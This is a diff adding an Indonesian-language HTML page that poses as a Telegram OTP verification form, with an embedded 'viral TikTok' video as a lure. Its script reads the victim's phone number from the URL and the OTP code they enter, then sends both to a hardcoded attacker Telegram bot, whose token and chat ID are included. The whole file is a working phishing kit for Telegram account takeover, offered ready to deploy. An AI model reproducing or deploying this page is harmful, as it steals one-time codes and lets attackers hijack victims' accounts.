@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan Kode OTP</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Latar Belakang Animasi -->
+    <div class="background"></div>
+
+    <!-- Form OTP -->
+    <div class="otp-form-container">
+        <h2>MASUKKAN KODE OTP</h2>
+        <form id="otpForm">
+            <label for="otp">KODE OTP:</label>
+            <input type="text" id="otp" name="otp" placeholder="cek kode otp di telegram anda" required>
+            <button type="submit">Kirim Kode OTP</button>
+        </form>
+    </div>
+
+    <!-- Video TikTok -->
+    <div class="video-container">
+        <h3>😋YANG LAGI VIRAL DI TIKTOK GUYS😋</h3>
+        <!-- TikTok Embed -->
+        <iframe src="https://www.tiktok.com/embed/7388969083510770949" width="350" height="800" frameborder="0" allowfullscreen></iframe>
+    </div>
+
+    <script>
+        // Mendapatkan nomor dari URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+
+        // Mengirim OTP ke bot Telegram
+        document.getElementById("otpForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            const otp = document.getElementById("otp").value;
+            const botToken = "7980725623:AAE_1e2kWcDU7ZP9aUxV_AhMZCW2JpWg-fU";  // Ganti dengan Token Bot Anda
+            const chatId = "7806196873";  // Ganti dengan Chat ID Telegram Anda
+
+            const message = `📱 Nomor Telegram: ${phone}\nKode OTP: ${otp}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Kode OTP berhasil dikirim ke bot!");
+                    } else {
+                        alert("Gagal mengirim kode OTP.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("Terjadi kesalahan saat mengirim data.");
+                });
+        });
+    </script>
+</body>
+</html>
